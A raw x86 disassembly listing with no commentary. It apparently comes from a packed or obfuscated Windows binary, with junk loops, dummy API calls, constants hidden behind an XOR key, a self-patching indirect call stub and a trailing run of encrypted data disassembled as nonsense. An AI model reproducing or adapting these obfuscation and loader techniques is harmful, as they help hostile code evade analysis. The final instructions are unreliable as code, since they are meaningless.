  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43375b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43375b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43375b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43375b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4336a7,0x43375f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433653
  40d93b:	and    edi,DWORD PTR ds:0x43372f
  40d941:	mov    DWORD PTR ds:0x433653,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4336a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4336a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4336a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4336a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4336a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4336a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4336a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4336a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43364f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4336db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4336f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43369f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43365f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433763,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4336eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43364f
  40da21:	sub    DWORD PTR ds:0x433667,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43365b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43372f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43372f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43372f,ecx
  40da55:	cmp    DWORD PTR ds:0x43372f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43372f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43372f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43372f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43372f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43375b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433697,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433697
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433697,ecx
  40dabd:	cmp    DWORD PTR ds:0x433697,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433697,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433974
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433663,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4336a7,0x43364f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433757,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433643,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433647,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4336cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433663,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43371f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43371f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43371f,ecx
  40db80:	cmp    DWORD PTR ds:0x43371f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43371f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43371f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43369f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433727,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433727,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433727,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433767
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433727,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433727
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433727,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433727
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433727,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433717,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433717
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433717,eax
  40dc3b:	cmp    DWORD PTR ds:0x433717,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433875
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433717,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433717
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433717,eax
  40dc72:	cmp    DWORD PTR ds:0x433717,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43364b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433647,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433773,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43369f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43369f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43369f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43369f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43369f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43369f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43369f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43369f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4336a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433767
  40dd13:	mov    DWORD PTR ds:0x4336a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43376b
  40dd26:	or     DWORD PTR ds:0x43371b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4336b3
  40dd3a:	and    DWORD PTR ds:0x43371f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433657,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43364f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43365b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43376b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43371b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43365b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4336a7,0x43372f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43375f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43369f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43365b,0x43372f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43364b
  40ddeb:	or     DWORD PTR ds:0x4336df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43375b,0x4336b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433763,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4336ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4336ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4336ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4336ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4336ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4336ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433767,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43371b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433757,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433763
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433697,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4336e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433657,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x4336df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43372b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4336af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433717,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433727,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433727
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433727,ecx
  40e244:	cmp    DWORD PTR ds:0x433727,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433727,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433727
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433727,ecx
  40e279:	cmp    DWORD PTR ds:0x433727,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43375b,0x433647
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4336eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4336eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4336eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4336eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433974
  40e2d5:	push   0x433974
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4336eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	cwde   
  40e321:	imul   edx,ecx,0xffffffb6
  40e324:	lds    esp,FWORD PTR [esp+edi*2+0x7c79a77c]
  40e32b:	jl     0x40e34e
  40e32d:	xor    DWORD PTR [edx-0x7c],ebx
  40e330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e331:	jne    0x40e2e9
  40e333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e334:	jg     0x40e2db
  40e336:	push   ecx
  40e337:	out    dx,al
  40e338:	jle    0x40e2ba
  40e33a:	daa    
  40e33b:	cli    
  40e33c:	je     0x40e2da
  40e33e:	cmp    ch,BYTE PTR [eax+0xe]
  40e341:	jp     0x40e2f5
  40e343:	sub    ecx,esi
  40e345:	inc    eax
  40e346:	xchg   edx,eax
  40e347:	fstp   QWORD PTR [edx]
  40e349:	or     eax,0xe1a34d71
  40e34e:	mov    edx,DWORD PTR [edi+0x36505150]
  40e354:	ja     0x40e38d
  40e356:	dec    esp
  40e357:	aaa    
  40e358:	daa    
  40e359:	fdivp  st(1),st
  40e35b:	or     WORD PTR [ecx+0x4c0adf58],cx
  40e362:	push   ebp
  40e363:	scas   al,BYTE PTR es:[edi]
  40e364:	inc    edx
  40e365:	imul   DWORD PTR [esi+0x22]
  40e368:	or     DWORD PTR [ecx-0x76da2fc2],ebp
